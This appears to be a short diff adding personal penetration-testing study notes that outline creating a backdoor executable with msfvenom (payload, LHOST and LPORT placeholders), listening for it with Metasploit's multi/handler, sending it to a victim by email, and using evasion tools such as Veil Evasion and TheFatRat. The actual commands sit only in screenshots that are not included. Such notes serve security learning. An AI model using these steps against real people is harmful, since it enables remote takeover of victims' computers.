@@ -1,0 +1,9 @@
+- The idea here is to attack a server from a client connected to it
+- Here we'll use a way to seize control of the client by sending him a "Backdoor" (A file .exe, that whenever executed by the target gives us access)
+- We'll create it using "MSFVENOM"
+- Here in this command below to create that file, we write -p [System_Configuration&Which_Protocol_we're_targeting] LHOST=[Our_IP_Address] LPORT=[ThePort_InQuestion] -f [FileFormat] -o [Where to create the file in our Kali System]
+![[Capture d’écran (3131).png]]
+- Then we open msf, exploit /multi/handler, to keep listening if someone in another machine executed our Backdoor file.
+![[Capture d’écran (3132).png]]
+- And so we send it to him by email or any other way.
+- We can also use tools like "Veil Evasion" & "TheFatRat" as alternatives to MSFVENOM...
